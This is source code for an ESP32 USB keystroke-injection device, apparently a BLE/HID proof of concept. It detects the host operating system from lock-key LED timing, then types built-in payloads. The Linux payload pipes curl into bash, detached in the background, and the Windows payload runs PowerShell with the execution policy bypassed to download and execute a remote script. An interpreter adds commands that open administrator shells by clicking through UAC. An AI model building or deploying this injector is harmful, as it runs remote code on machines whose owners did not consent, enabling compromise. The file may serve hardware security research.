#include "usb_hid.h"
#include "ble_hid.h"   // bleHidMac() for {MAC} substitution
#include <Arduino.h>

#ifndef POC_HAS_USB_HID
// ---- C5 / no-USB-OTG: stub. The USB-side bootstrap is run manually on the PC. --
void usbHidBegin() { /* no USB HID on this chip */ }
// No LittleFS payloads on this board -> editing is unavailable.
bool pocFsRead(const char*, String&)        { return false; }
bool pocFsWriteBegin(const char*)           { return false; }
bool pocFsWriteChunk(const uint8_t*, size_t){ return false; }
bool pocFsWriteEnd(size_t&)                 { return false; }
bool usbHidMounted()                        { return false; }   // no USB device role here

#else
// ---- S3 / real USB HID: OS detection + LittleFS payload interpreter -----------
#include <LittleFS.h>
#include "USB.h"
#include "USBHIDKeyboard.h"
// Stock header lacks these; press() maps KEY_x-0x88 -> HID usage.
#ifndef KEY_NUM_LOCK
#define KEY_NUM_LOCK    0xDB
#endif
#ifndef KEY_SCROLL_LOCK
#define KEY_SCROLL_LOCK 0xCF
#endif

static USBHIDKeyboard Keyboard;

static volatile bool          led_response_received = false;
static volatile int           led_event_count = 0;
static volatile unsigned long led_event_time = 0;
static volatile bool          caps_status = false, num_status = false, scroll_status = false;
static unsigned long caps_sent_time = 0, num_sent_time = 0, scroll_sent_time = 0;
static unsigned long caps_delay = 0, num_delay = 0, scroll_delay = 0;

static void usbEventCallback(void*, esp_event_base_t base, int32_t id, void* ev) {
    if (base == ARDUINO_USB_HID_KEYBOARD_EVENTS && id == ARDUINO_USB_HID_KEYBOARD_LED_EVENT) {
        arduino_usb_hid_keyboard_event_data_t* d = (arduino_usb_hid_keyboard_event_data_t*)ev;
        led_response_received = true; led_event_count++; led_event_time = millis();
        caps_status = d->capslock != 0; num_status = d->numlock != 0; scroll_status = d->scrolllock != 0;
        if (caps_sent_time   > 0 && caps_delay   == 0) caps_delay   = led_event_time - caps_sent_time;
        if (num_sent_time    > 0 && num_delay    == 0) num_delay    = led_event_time - num_sent_time;
        if (scroll_sent_time > 0 && scroll_delay == 0) scroll_delay = led_event_time - scroll_sent_time;
    }
}

static void toggleKey(uint8_t key, unsigned long* t) {
    *t = millis(); led_response_received = false;
    Keyboard.press(key); delay(300); Keyboard.release(key); delay(800);
}

static int classifyOS() {
    led_event_count = 0; caps_status = num_status = scroll_status = false;
    caps_delay = num_delay = scroll_delay = 0; caps_sent_time = num_sent_time = scroll_sent_time = 0;
    led_response_received = false;
    uint8_t initial_caps = caps_status;
    toggleKey(KEY_CAPS_LOCK, &caps_sent_time); delay(1500);
    if (!led_response_received && caps_status != initial_caps) return POC_OS_IOS;
    toggleKey(KEY_NUM_LOCK, &num_sent_time); delay(1200);
    toggleKey(KEY_SCROLL_LOCK, &scroll_sent_time); delay(1200);
    if (led_event_count == 0) return (caps_status != initial_caps) ? POC_OS_IOS : POC_OS_MACOS;
    if (led_event_count >= 3 && caps_delay < 100 && num_delay < 100 && scroll_delay < 100) return POC_OS_WINDOWS;
    bool hn = (num_delay > 0), hs = (scroll_delay > 0);
    if (led_event_count == 1 && caps_status != initial_caps && caps_delay > 0 && caps_delay < 20 && !hn && !hs) return POC_OS_CHROMEOS;
    if (num_status && !scroll_status && hn && !hs) return POC_OS_LINUX;
    if ((caps_delay > 200 || num_delay > 200 || scroll_delay > 200) && (hn || hs)) return POC_OS_ANDROID;
    if (caps_status != initial_caps) return POC_OS_IOS;
    return POC_OS_UNKNOWN;
}

static void resetLocks() {
    unsigned long tmp; delay(300);
    if (caps_status)   { toggleKey(KEY_CAPS_LOCK,   &tmp); delay(200); }
    if (num_status)    { toggleKey(KEY_NUM_LOCK,    &tmp); delay(200); }
    if (scroll_status) { toggleKey(KEY_SCROLL_LOCK, &tmp); delay(200); }
}

int usbDetectOS() { int os = classifyOS(); resetLocks(); return os; }

const char* usbOsName(int os) {
    switch (os) {
        case POC_OS_WINDOWS: return "Windows"; case POC_OS_LINUX: return "Linux";
        case POC_OS_MACOS: return "Macos";     case POC_OS_IOS: return "iOS";
        case POC_OS_ANDROID: return "Android"; case POC_OS_CHROMEOS: return "ChromeOS";
        default: return "Unknown";
    }
}

void usbHidType(const char* s) { int d = bleTypeDelay(); for (const char* p = s; *p; ++p) { Keyboard.write((uint8_t)*p); if (d) delay(d); } }

static void tapGui(const String& arg) {
    Keyboard.press(KEY_LEFT_GUI);
    if (arg == "SPACE") Keyboard.press(' ');
    else if (arg.length() == 1) Keyboard.press(arg[0]);
    delay(90); Keyboard.releaseAll();
}

// Built-in default payloads (mirror data/*.txt). The board ALWAYS has a working
// payload even if LittleFS is empty/broken; an on-FS file (user edit) overrides.
static const char DEF_LINUX[] = R"(# Linux / Ubuntu-GNOME: open a terminal, fetch+run the pairing helper detached.
# {MAC} = this board's BLE address. Format: GUI [key]|CTRLALT <key>|STRING <text>|ENTER|DELAY <ms>|# comment
CTRLALT t
DELAY 1500
STRING nohup bash -c 'curl -sL whitewhidow.github.io/hid-ble-poc/pair.sh | bash -s {MAC}' >/dev/null 2>&1 & disown; exit
ENTER
)";
static const char DEF_WINDOWS[] = R"PAY(# Windows: run pair_win.ps1 in an -MTA PowerShell (WinRT BLE async hangs in the
# default STA console). ?_=(Get-Random) busts the WebClient cache.
GUI r
DELAY 800
STRING powershell -MTA -NoExit -ExecutionPolicy Bypass -Command "& ([scriptblock]::Create((New-Object Net.WebClient).DownloadString('https://whitewhidow.github.io/hid-ble-poc/pair_win.ps1?_=' + (Get-Random)))) -MAC '{MAC}'"
ENTER
)PAY";
static const char DEF_MACOS[] = R"(# macOS (placeholder): Spotlight -> Terminal + a note. No real BLE helper yet.
GUI SPACE
DELAY 600
STRING Terminal
ENTER
DELAY 1600
STRING # PoC-KBD ({MAC}) - macOS BLE pairing bootstrap not implemented yet
ENTER
)";
static const char* defaultPayload(int os) {
    switch (os) { case POC_OS_WINDOWS: return DEF_WINDOWS; case POC_OS_MACOS: return DEF_MACOS; default: return DEF_LINUX; }
}
static const char* osPath(int os) {
    switch (os) { case POC_OS_WINDOWS: return "/windows.txt"; case POC_OS_MACOS: return "/macos.txt"; default: return "/linux.txt"; }
}

// key-name -> Arduino keycode (for Press/PressRelease). Single chars pass through.
static uint8_t usbKeyByName(const String& n) {
    struct { const char* n; uint8_t k; } T[] = {
        {"KEY_LEFT_CTRL",KEY_LEFT_CTRL},{"KEY_LEFT_SHIFT",KEY_LEFT_SHIFT},{"KEY_LEFT_ALT",KEY_LEFT_ALT},{"KEY_LEFT_GUI",KEY_LEFT_GUI},
        {"KEY_RIGHT_CTRL",KEY_RIGHT_CTRL},{"KEY_RIGHT_SHIFT",KEY_RIGHT_SHIFT},{"KEY_RIGHT_ALT",KEY_RIGHT_ALT},{"KEY_RIGHT_GUI",KEY_RIGHT_GUI},
        {"KEY_ENTER",KEY_RETURN},{"KEY_RETURN",KEY_RETURN},{"KEY_ESC",KEY_ESC},{"KEY_BACKSPACE",KEY_BACKSPACE},{"KEY_TAB",KEY_TAB},
        {"KEY_UP_ARROW",KEY_UP_ARROW},{"KEY_DOWN_ARROW",KEY_DOWN_ARROW},{"KEY_LEFT_ARROW",KEY_LEFT_ARROW},{"KEY_RIGHT_ARROW",KEY_RIGHT_ARROW},
        {"KEY_INSERT",KEY_INSERT},{"KEY_DELETE",KEY_DELETE},{"KEY_PAGE_UP",KEY_PAGE_UP},{"KEY_PAGE_DOWN",KEY_PAGE_DOWN},
        {"KEY_HOME",KEY_HOME},{"KEY_END",KEY_END},{"KEY_CAPS_LOCK",KEY_CAPS_LOCK},{"KEY_NUM_LOCK",KEY_NUM_LOCK},{"KEY_SCROLL_LOCK",KEY_SCROLL_LOCK},
        {"KEY_F1",KEY_F1},{"KEY_F2",KEY_F2},{"KEY_F3",KEY_F3},{"KEY_F4",KEY_F4},{"KEY_F5",KEY_F5},{"KEY_F6",KEY_F6},
        {"KEY_F7",KEY_F7},{"KEY_F8",KEY_F8},{"KEY_F9",KEY_F9},{"KEY_F10",KEY_F10},{"KEY_F11",KEY_F11},{"KEY_F12",KEY_F12},
    };
    for (auto& e : T) if (n == e.n) return e.k;
    if (n.length() == 1) return (uint8_t)n[0];
    return 0;
}
// press modifier(s) + key/char together, hold, release
static void usbCombo(uint8_t m1, uint8_t m2, uint8_t key, char ch) {
    if (m1) Keyboard.press(m1);
    if (m2) Keyboard.press(m2);
    if (key) Keyboard.press(key); else if (ch) Keyboard.press(ch);
    delay(100); Keyboard.releaseAll();
}
static String subMac(const String& s) { String r = s; r.replace("{MAC}", bleHidMac()); return r; }

// Interpreter over a payload string. Supports our GUI/STRING/ENTER/DELAY/CTRLALT
// AND the Evil Crow Cable "Wind" command set (Print/PrintLine/Press/PressRelease/
// Release/Gui*/RunWin/RunNix/RunMac/RunLauncher/RunCmdAdmin/RunPowershellAdmin).
static void usbRunPayloadContent(const String& content) {
    int start = 0, n = content.length();
    while (start < n) {
        int nl = content.indexOf('\n', start);
        String line = (nl < 0) ? content.substring(start) : content.substring(start, nl);
        start = (nl < 0) ? n : nl + 1;
        line.trim();
        if (line.length() == 0 || line[0] == '#' || line.startsWith("REM")) continue;
        // our original verbs
        if (line == "ENTER") Keyboard.write((uint8_t)'\n');
        else if (line.startsWith("DELAY ") || line.startsWith("Delay ")) delay(line.substring(6).toInt());
        else if (line.startsWith("STRING ")) usbHidType(subMac(line.substring(7)).c_str());
        else if (line == "GUI") tapGui("");
        else if (line.startsWith("GUI ")) { String a = line.substring(4); a.trim(); tapGui(a); }
        else if (line.startsWith("CTRLALT ")) usbCombo(KEY_LEFT_CTRL, KEY_LEFT_ALT, 0, line.charAt(8));
        // Evil Crow "Wind"
        else if (line.startsWith("PrintLine "))  Keyboard.println(subMac(line.substring(10)).c_str());
        else if (line.startsWith("Print "))      Keyboard.print(subMac(line.substring(6)).c_str());
        else if (line.startsWith("WinPrintLine "))Keyboard.println(subMac(line.substring(13)).c_str());
        else if (line.startsWith("WinPrint "))   Keyboard.print(subMac(line.substring(9)).c_str());
        else if (line == "Gui")       usbCombo(KEY_LEFT_GUI, 0, 0, 0);
        else if (line == "GuiR")      usbCombo(KEY_LEFT_GUI, 0, 0, 'r');
        else if (line == "GuiSpace")  usbCombo(KEY_LEFT_GUI, 0, 0, ' ');
        else if (line == "AltF2")     usbCombo(KEY_LEFT_ALT, 0, KEY_F2, 0);
        else if (line == "CtrlAltT")  usbCombo(KEY_LEFT_CTRL, KEY_LEFT_ALT, 0, 't');
        else if (line.startsWith("PressRelease ")) { uint8_t k = usbKeyByName(line.substring(13)); if (k) { Keyboard.press(k); delay(100); Keyboard.releaseAll(); } }
        else if (line.startsWith("Press "))        { uint8_t k = usbKeyByName(line.substring(6));  if (k) Keyboard.press(k); }
        else if (line.startsWith("Release"))       Keyboard.releaseAll();
        else if (line.startsWith("RunWin "))      { usbCombo(KEY_LEFT_GUI, 0, 0, 'r');            delay(2000); Keyboard.println(subMac(line.substring(7)).c_str()); }
        else if (line.startsWith("RunNix "))      { usbCombo(KEY_LEFT_CTRL, KEY_LEFT_ALT, 0, 't'); delay(2000); Keyboard.println(subMac(line.substring(7)).c_str()); }
        else if (line.startsWith("RunMac "))      { usbCombo(KEY_LEFT_GUI, 0, 0, ' ');            delay(2000); Keyboard.println(subMac(line.substring(7)).c_str()); }
        else if (line.startsWith("RunLauncher ")) { usbCombo(KEY_LEFT_ALT, 0, KEY_F2, 0);         delay(2000); Keyboard.println(subMac(line.substring(12)).c_str()); }
        else if (line.startsWith("RunPowershellAdmin")) { usbCombo(KEY_LEFT_GUI, 0, 0, 'x'); delay(2000); Keyboard.print("a"); delay(3000); Keyboard.press(KEY_LEFT_ARROW); delay(100); Keyboard.releaseAll(); delay(100); Keyboard.press(KEY_RETURN); delay(100); Keyboard.releaseAll(); }
        else if (line.startsWith("RunCmdAdmin"))  { usbCombo(KEY_LEFT_GUI, 0, 0, 'r'); delay(2000); Keyboard.print("cmd"); delay(2000); Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press(KEY_RETURN); delay(100); Keyboard.releaseAll(); delay(2000); Keyboard.press(KEY_LEFT_ARROW); delay(100); Keyboard.releaseAll(); delay(100); Keyboard.press(KEY_RETURN); delay(100); Keyboard.releaseAll(); }
        else if (line == "DetectOS" || line.startsWith("ShellWin") || line.startsWith("ShellNix") || line.startsWith("ShellMac") || line.startsWith("ServerConnect")) { /* network/LED — not on this path */ }
        else usbHidType(subMac(line).c_str());   // fallback: type the line literally
    }
}

// USB enumerated AND not suspended = a host is really there to receive keystrokes.
extern "C" bool tud_mounted(void);
extern "C" bool tud_suspended(void);
bool usbHidMounted() { return tud_mounted() && !tud_suspended(); }

void usbSamplePayload(int os) {
    String content;
    File f = LittleFS.open(osPath(os), "r");           // on-FS file (user edit) wins if non-empty
    if (f) { while (f.available()) content += (char)f.read(); f.close(); }
    if (content.length() == 0) { Serial.println("[fs] payload empty/missing -> built-in default"); content = defaultPayload(os); }
    usbRunPayloadContent(content);
}

// ---- Payload-file editing over BLE (LittleFS) --------------------------------
// Only the three OS payloads are addressable; reject anything else so a bad/rogue
// name can't reach arbitrary paths.
static bool fsPath(const char* os, char* out, size_t n) {
    if (!strcmp(os, "linux") || !strcmp(os, "windows") || !strcmp(os, "macos")) {
        snprintf(out, n, "/%s.txt", os); return true;
    }
    return false;
}

static File   s_wf;          // file open for a phone-driven write
static size_t s_wn = 0;      // bytes written so far

bool pocFsRead(const char* os, String& out) {
    char p[24]; if (!fsPath(os, p, sizeof(p))) return false;
    LittleFS.begin(true, "/littlefs", 10, "littlefs");
    File f = LittleFS.open(p, "r");
    out = "";
    if (f) { out.reserve(f.size()); while (f.available()) out += (char)f.read(); f.close(); }
    return out.length() > 0;   // empty/missing -> false so the web shows its built-in default
}
bool pocFsWriteBegin(const char* os) {
    char p[24]; if (!fsPath(os, p, sizeof(p))) return false;
    LittleFS.begin(true, "/littlefs", 10, "littlefs");
    s_wf = LittleFS.open(p, "w"); s_wn = 0; return (bool)s_wf;
}
bool pocFsWriteChunk(const uint8_t* data, size_t n) {
    if (!s_wf) return false;
    size_t w = s_wf.write(data, n); s_wn += w; return w == n;
}
bool pocFsWriteEnd(size_t& sizeOut) {
    if (!s_wf) return false;
    sizeOut = s_wn; s_wf.close(); return true;
}

// (Re)create a payload file if it is missing OR empty (0-byte files were the cause
// of "payloads gone"); a real, non-empty user file is kept.
static void seedPayload(int os) {
    const char* path = osPath(os);
    File r = LittleFS.open(path, "r");
    size_t sz = r ? r.size() : 0; if (r) r.close();
    if (sz > 0) return;
    File f = LittleFS.open(path, "w");
    if (f) { f.print(defaultPayload(os)); f.close(); Serial.printf("[fs] seeded %s\n", path); }
    else Serial.printf("[fs] seed FAILED %s\n", path);
}

void usbHidBegin() {
    // Mount LittleFS (by its partition label); if it won't mount or won't accept a
    // write, reformat clean. Then ensure every payload is present + non-empty.
    bool ok = LittleFS.begin(true, "/littlefs", 10, "littlefs");
    Serial.printf("[fs] mount %s\n", ok ? "ok" : "FAIL");
    if (!ok) { LittleFS.format(); ok = LittleFS.begin(true, "/littlefs", 10, "littlefs"); Serial.printf("[fs] reformat->mount %s\n", ok ? "ok" : "FAIL"); }
    File t = LittleFS.open("/.wtest", "w");
    if (!t) { Serial.println("[fs] write-test FAIL -> format"); LittleFS.format(); LittleFS.begin(true, "/littlefs", 10, "littlefs"); }
    else    { t.close(); LittleFS.remove("/.wtest"); }
    seedPayload(POC_OS_LINUX); seedPayload(POC_OS_WINDOWS); seedPayload(POC_OS_MACOS);
    USB.onEvent(usbEventCallback);
    Keyboard.onEvent(usbEventCallback);
    USB.begin();
    Keyboard.begin();
}
#endif // POC_HAS_USB_HID
